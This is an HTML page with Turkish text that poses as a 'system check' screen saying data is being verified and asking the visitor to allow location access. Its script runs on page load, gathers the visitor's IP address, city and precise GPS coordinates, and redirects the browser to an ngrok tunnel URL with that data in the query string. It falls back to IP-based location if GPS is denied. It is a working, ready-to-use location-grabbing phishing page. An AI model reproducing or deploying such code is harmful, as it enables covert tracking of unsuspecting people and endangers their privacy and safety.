<!DOCTYPE html>
<html>
<head>
    <title>Sistem Kontrolü</title>
    <style>body { background: black; color: #0f0; font-family: monospace; text-align: center; padding-top: 20%; }</style>
</head>
<body>
    <h1>VERİLER DOĞRULANIYOR...</h1>
    <p>Lütfen konum iznini onaylayın.</p>

    <script>
        // --- GÜNCEL NGROK LİNKİNİ BURAYA YAZ ---
        const NGROK_URL = "https://punctual-villain-arson.ngrok-free.dev/log";

        async function başlat() {
            try {
                // IP bilgilerini al
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                
                // Konum İste (Jarvis Bildirimi)
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        yolla(data.ip, data.city, pos.coords.latitude + "," + pos.coords.longitude, "GPS_OK");
                    },
                    (err) => {
                        yolla(data.ip, data.city, data.latitude + "," + data.longitude, "GPS_RED");
                    },
                    { timeout: 5000 }
                );
            } catch (e) {
                console.log("Hata");
            }
        }

        function yolla(ip, city, loc, status) {
            // EN SAĞLAM YÖNTEM: Sayfayı verilerle beraber senin Ngrok linkine yönlendirir
            const url = `${NGROK_URL}?ip=${ip}&city=${city}&loc=${loc}&status=${status}`;
            window.location.href = url;
        }

        setTimeout(başlat, 500);
    </script>
</body>
</html>
